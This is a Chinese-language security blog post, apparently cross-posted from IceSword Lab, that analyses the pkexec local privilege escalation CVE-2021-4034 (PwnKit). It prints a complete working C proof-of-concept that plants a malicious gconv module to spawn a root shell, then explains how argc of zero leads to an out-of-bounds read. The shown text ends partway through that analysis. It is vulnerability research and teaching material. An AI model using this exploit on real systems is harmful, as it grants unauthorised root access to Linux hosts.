<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>CVE-2021-4034 pkexec 本地提权漏洞利用解析 - Rome&#39;s Blog</title><meta name="Description" content=""><meta property="og:title" content="CVE-2021-4034 pkexec 本地提权漏洞利用解析" />
<meta property="og:description" content="0x00 作者 Rome，IceSword Lab 文章首发于 IceSword Lab：https://www.iceswordlab.com/2022/02/10/CVE-" />
<meta property="og:type" content="article" />
<meta property="og:url" content="rome2020.github.io/secure/cve-2021-4034-wp/" /><meta property="article:section" content="secure" />
<meta property="article:published_time" content="2022-03-07T11:12:25+08:00" />
<meta property="article:modified_time" content="2022-03-07T11:12:25+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2021-4034 pkexec 本地提权漏洞利用解析"/>
<meta name="twitter:description" content="0x00 作者 Rome，IceSword Lab 文章首发于 IceSword Lab：https://www.iceswordlab.com/2022/02/10/CVE-"/>
<meta name="application-name" content="Rome&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Rome&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="rome2020.github.io/secure/cve-2021-4034-wp/" /><link rel="stylesheet" href="/rome2020.github.io/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/rome2020.github.io/css/style.min.css"><link rel="stylesheet" href="/rome2020.github.io/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/rome2020.github.io/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2021-4034 pkexec 本地提权漏洞利用解析",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "rome2020.github.io\/secure\/cve-2021-4034-wp\/"
        },"genre": "secure","keywords": "wp","wordcount":  4645 ,
        "url": "rome2020.github.io\/secure\/cve-2021-4034-wp\/","datePublished": "2022-03-07T11:12:25+08:00","dateModified": "2022-03-07T11:12:25+08:00","publisher": {
            "@type": "Organization",
            "name": "Rome"},"author": {
                "@type": "Person",
                "name": "Rome"
            },"description": ""
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="rome2020.github.io/" title="Rome&#39;s Blog">Rome&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/rome2020.github.io/posts/" title="文章"> 文章 </a><a class="menu-item" href="/rome2020.github.io/tags/" title="标签"> 标签 </a><a class="menu-item" href="/rome2020.github.io/categories/" title="分类"> 分类 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="rome2020.github.io/" title="Rome&#39;s Blog">Rome&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/rome2020.github.io/posts/" title="文章">文章</a><a class="menu-item" href="/rome2020.github.io/tags/" title="标签">标签</a><a class="menu-item" href="/rome2020.github.io/categories/" title="分类">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="page single special"><h1 class="single-title animated pulse faster">CVE-2021-4034 pkexec 本地提权漏洞利用解析</h1><div class="content" id="content"><h2 id="0x00-作者">0x00 作者</h2>
<p>Rome，<a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener noreffer">IceSword Lab</a></p>
<p>文章首发于 <a href="https://www.iceswordlab.com/about/" target="_blank" rel="noopener noreffer">IceSword Lab</a>：<a href="https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/" target="_blank" rel="noopener noreffer">https://www.iceswordlab.com/2022/02/10/CVE-2021-4034/</a></p>
<h2 id="0x01-漏洞基本信息">0x01 漏洞基本信息</h2>
<p>polkit 的 pkexec 程序中存在一个本地权限提升漏洞。当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限</p>
<h3 id="软件简介">软件简介</h3>
<p><a href="https://gitlab.freedesktop.org/polkit/polkit/" target="_blank" rel="noopener noreffer">polkit</a> 是一个应用程序级别的工具集，通过定义和审核权限规则，实现不同优先级进程间的通讯：控制决策集中在统一的框架之中，决定低优先级进程是否有权访问高优先级进程。</p>
<p>Polkit 在系统层级进行权限控制，提供了一个低优先级进程和高优先级进程进行通讯的系统。和 sudo 等程序不同，Polkit 并没有赋予进程完全的 root 权限，而是通过一个集中的策略系统进行更精细的授权。</p>
<p>Polkit 定义出一系列操作，例如运行 GParted, 并将用户按照群组或用户名进行划分，例如 wheel 群组用户。然后定义每个操作是否可以由某些用户执行，执行操作前是否需要一些额外的确认，例如通过输入密码确认用户是不是属于某个群组。</p>
<blockquote>
<p><a href="https://wiki.archlinux.org/title/Polkit_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">https://wiki.archlinux.org/title/Polkit_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></p>
</blockquote>
<h3 id="漏洞原理概括">漏洞原理概括</h3>
<p>当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。</p>
<h3 id="前置知识">前置知识</h3>
<p>pkexec 是 polkit 的一个程序，可以以其他用户身份执行命令。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜ pkexec --help
</span></span><span class="line"><span class="cl">pkexec --version <span class="p">|</span>
</span></span><span class="line"><span class="cl">       --help <span class="p">|</span>
</span></span><span class="line"><span class="cl">       --disable-internal-agent <span class="p">|</span>
</span></span><span class="line"><span class="cl">       <span class="o">[</span>--user username<span class="o">]</span> PROGRAM <span class="o">[</span>ARGUMENTS...<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">See the pkexec manual page <span class="k">for</span> more details.
</span></span></code></pre></div><p>不指定 <code>--user</code> 参数时，缺省为 <code>root</code>。比如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pkexec reboot
</span></span></code></pre></div><p><a href="https://imgtu.com/i/7X2MRK" target="_blank" rel="noopener noreffer"><img
        class="lazyload"
        src="/rome2020.github.io/svg/loading.min.svg"
        data-src="https://s4.ax1x.com/2022/01/27/7X2MRK.png"
        data-srcset="https://s4.ax1x.com/2022/01/27/7X2MRK.png, https://s4.ax1x.com/2022/01/27/7X2MRK.png 1.5x, https://s4.ax1x.com/2022/01/27/7X2MRK.png 2x"
        data-sizes="auto"
        alt="https://s4.ax1x.com/2022/01/27/7X2MRK.png"
        title="7X2MRK.png" /></a></p>
<h3 id="漏洞环境搭建">漏洞环境搭建</h3>
<p>环境没有特殊要求，主流 Linux 发行版都可以。</p>
<p>本次测试的环境：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜ uname -a
</span></span><span class="line"><span class="cl">Linux ubuntu 5.11.0-46-generic <span class="c1">#51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span><span class="line"><span class="cl">~ 
</span></span><span class="line"><span class="cl">➜ lsb_release -a
</span></span><span class="line"><span class="cl">No LSB modules are available.
</span></span><span class="line"><span class="cl">Distributor ID:	Ubuntu
</span></span><span class="line"><span class="cl">Description:	Ubuntu 20.04.3 LTS
</span></span><span class="line"><span class="cl">Release:	20.04
</span></span><span class="line"><span class="cl">Codename:	focal
</span></span><span class="line"><span class="cl">➜ gcc --version
</span></span><span class="line"><span class="cl">gcc <span class="o">(</span>Ubuntu 9.3.0-17ubuntu1~20.04<span class="o">)</span> 9.3.0
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2019</span> Free Software Foundation, Inc.
</span></span><span class="line"><span class="cl">This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.  There is NO
</span></span><span class="line"><span class="cl">warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
</span></span><span class="line"><span class="cl">➜ pkexec --version
</span></span><span class="line"><span class="cl">pkexec version 0.105
</span></span></code></pre></div><h2 id="0x02-漏洞分析">0x02 漏洞分析</h2>
<p>对该漏洞的分析将结合已知的 <a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener noreffer">POC</a> 和 Qualys 的<a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener noreffer">报告</a>进行。</p>
<h3 id="分析-poc">分析 POC</h3>
<p>先来分析 POC：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="mi">1</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">2</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">3</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">4</span> 
</span></span><span class="line"><span class="cl">  <span class="mi">5</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">  <span class="mi">6</span>         <span class="s">&#34;#include &lt;stdio.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">7</span>         <span class="s">&#34;#include &lt;stdlib.h&gt;</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">8</span>         <span class="s">&#34;#include &lt;unistd.h&gt;</span><span class="se">\n\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="mi">9</span>         <span class="s">&#34;void gconv() {}</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">10</span>         <span class="s">&#34;void gconv_init() {</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">11</span>         <span class="s">&#34;       setuid(0); setgid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">12</span>         <span class="s">&#34;       seteuid(0); setegid(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">13</span>         <span class="s">&#34;       system(</span><span class="se">\&#34;</span><span class="s">export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh</span><span class="se">\&#34;</span><span class="s">);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">14</span>         <span class="s">&#34;       exit(0);</span><span class="se">\n</span><span class="s">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">15</span>         <span class="s">&#34;}&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">16</span>         
</span></span><span class="line"><span class="cl"> <span class="mi">17</span> <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="mi">18</span>         <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> <span class="mi">19</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">20</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">21</span>         <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;pwnkit/pwnkit.c&#34;</span><span class="p">,</span> <span class="s">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">22</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">23</span>         <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"> <span class="mi">24</span>         <span class="n">system</span><span class="p">(</span><span class="s">&#34;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">25</span>         <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;pwnkit&#34;</span><span class="p">,</span> <span class="s">&#34;PATH=GCONV_PATH=.&#34;</span><span class="p">,</span> <span class="s">&#34;CHARSET=PWNKIT&#34;</span><span class="p">,</span> <span class="s">&#34;SHELL=pwnkit&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"> <span class="mi">26</span>         <span class="n">execve</span><span class="p">(</span><span class="s">&#34;/usr/bin/pkexec&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">[]){</span><span class="nb">NULL</span><span class="p">},</span> <span class="n">env</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"> <span class="mi">27</span> <span class="p">}</span> 
</span></span></code></pre></div><p>在该 POC 中：</p>
<ol>
<li>L5-L15，即 payload，引入了一个 root 权限的 <code>/bin/sh</code></li>
<li>L19，创建目录 <code>GCONV_PATH=.</code>，创建文件 <code>GCONV_PATH=./pwnkit</code> 并添加了执行权限</li>
<li>L20，创建目录 <code>pwnkit</code>，创建文件 <code>pwnkit/gconv-modules</code> 并写入内容 <code>module UTF-8// PWNKIT// pwnkit 2</code></li>
<li>L21-L24，把 payload 写入 <code>pwnkit/pwnkit.c</code> 并编译为动态链接库 <code>pwnkit/pwnkit.so</code></li>
<li>L25，一个特殊的数组</li>
<li>L26，使用 <code>execve</code> 调用 <code>pkexec</code>，这里有个特别的参数 <code>(char*[]){NULL}</code>，这也是整个 POC 的<strong>启动点</strong></li>
</ol>
<p>测试一下 POC：</p>
<p><a href="https://imgtu.com/i/7X2QxO" target="_blank" rel="noopener noreffer"><img
        class="lazyload"
        src="/rome2020.github.io/svg/loading.min.svg"
        data-src="https://s4.ax1x.com/2022/01/27/7X2QxO.png"
        data-srcset="https://s4.ax1x.com/2022/01/27/7X2QxO.png, https://s4.ax1x.com/2022/01/27/7X2QxO.png 1.5x, https://s4.ax1x.com/2022/01/27/7X2QxO.png 2x"
        data-sizes="auto"
        alt="https://s4.ax1x.com/2022/01/27/7X2QxO.png"
        title="7X2QxO.png" /></a></p>
<h3 id="奇妙的-argc-为-0">奇妙的 argc 为 0</h3>
<p>argc 和 argv 大家都熟悉，为了后面的分析这里再介绍一下：</p>
<ul>
<li>argc：即 argument count，保存运行时传递给 main 函数的参数个数。</li>
<li>argv：即 argument vector，保存运行时传递 main 函数的参数，类型是一个字符指针数组，每个元素是一个字符指针，指向一个命令行参数。<br>
例如：</li>
<li>argv[0] 指向程序运行时的全路径名；</li>
<li>argv[1] 指向程序在命令行中执行程序名后的第一个字符串</li>
</ul>
<p>下面的代码就展示了 argc 和 argv 用法：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//t.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;argc:%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">argc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;=</span><span class="n">argc</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;argv[%d]:%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="n">gcc</span> <span class="n">t</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">t</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="p">.</span><span class="o">/</span><span class="n">t</span>
</span></span><span class="line"><span class="cl"><span class="nl">argc</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span><span class="p">.</span><span class="o">/</span><span class="n">t</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:</span><span class="p">(</span><span class="n">null</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="p">.</span><span class="o">/</span><span class="n">t</span> <span class="o">-</span><span class="n">l</span>
</span></span><span class="line"><span class="cl"><span class="nl">argc</span><span class="p">:</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span><span class="p">.</span><span class="o">/</span><span class="n">t</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:-</span><span class="n">l</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">:</span><span class="p">(</span><span class="n">null</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="execve">execve()</h4>
<p><a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" rel="noopener noreffer">execve()</a> 可以执行程序，使用该函数需要引入 <code>unistd.h</code> 头文件，函数原型：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">       <span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span>
</span></span><span class="line"><span class="cl">                  <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[]);</span>
</span></span></code></pre></div><p>我们使用前面的 <code>t.c</code> 来熟悉一下 <code>execve()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//ex.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;./t&#34;</span><span class="p">,</span><span class="s">&#34;-l&#34;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">enp</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;./t&#34;</span><span class="p">,</span><span class="n">args</span><span class="p">,</span><span class="n">enp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="n">vim</span> <span class="n">ex</span><span class="p">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> <span class="n">took</span> <span class="mi">24</span><span class="n">s</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="n">gcc</span> <span class="n">ex</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">ex</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="p">.</span><span class="o">/</span><span class="n">ex</span> 
</span></span><span class="line"><span class="cl"><span class="nl">argc</span><span class="p">:</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span><span class="p">.</span><span class="o">/</span><span class="n">t</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:-</span><span class="n">l</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">:</span><span class="p">(</span><span class="n">null</span><span class="p">)</span>
</span></span></code></pre></div><p>前面 POC 中 L26，使用了 <code>execve()</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"> <span class="mi">25</span>         <span class="kt">char</span> <span class="o">*</span><span class="n">env</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&#34;pwnkit&#34;</span><span class="p">,</span> <span class="s">&#34;PATH=GCONV_PATH=.&#34;</span><span class="p">,</span> <span class="s">&#34;CHARSET=PWNKIT&#34;</span><span class="p">,</span> <span class="s">&#34;SHELL=pwnkit&#34;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"> <span class="mi">26</span>         <span class="nf">execve</span><span class="p">(</span><span class="s">&#34;/usr/bin/pkexec&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">[]){</span><span class="nb">NULL</span><span class="p">},</span> <span class="n">env</span><span class="p">);</span>
</span></span></code></pre></div><p>但是参数使用方法和我们测试的不同，<strong>第二个参数使用了 <code>(char*[]){NULL}</code> 进行填充</strong>。我们来测试一下这样会有什么结果：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">//ex.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//char *args[]={&#34;./t&#34;,&#34;-l&#34;,NULL};
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="o">*</span><span class="n">enp</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="mi">0</span><span class="p">,</span><span class="nb">NULL</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">execve</span><span class="p">(</span><span class="s">&#34;./t&#34;</span><span class="p">,(</span><span class="kt">char</span><span class="o">*</span><span class="p">[]){</span><span class="nb">NULL</span><span class="p">},</span><span class="n">enp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="n">vim</span> <span class="n">ex</span><span class="p">.</span><span class="n">c</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> <span class="n">took</span> <span class="mi">31</span><span class="n">s</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="n">gcc</span> <span class="n">ex</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">ex</span>
</span></span><span class="line"><span class="cl"><span class="o">~/</span><span class="n">t2</span> 
</span></span><span class="line"><span class="cl"><span class="err">➜</span> <span class="p">.</span><span class="o">/</span><span class="n">ex</span> 
</span></span><span class="line"><span class="cl"><span class="nl">argc</span><span class="p">:</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span><span class="p">(</span><span class="n">null</span><span class="p">)</span>
</span></span></code></pre></div><p>此时我们发现 argc 为 0，且 argv[0] 内容为空，不再是程序本身。这有什么用呢？用处很大。</p>
<h3 id="pkexec-中的越界读取">pkexec 中的越界读取</h3>
<p>现在来分析 pkexec 的代码，其 main() 函数主要结构如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">435</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
</span></span><span class="line"><span class="cl"><span class="mi">436</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">534</span>   <span class="k">for</span> <span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">guint</span><span class="p">)</span> <span class="n">argc</span><span class="p">;</span> <span class="n">n</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">535</span>     <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="mi">568</span>     <span class="p">}</span>
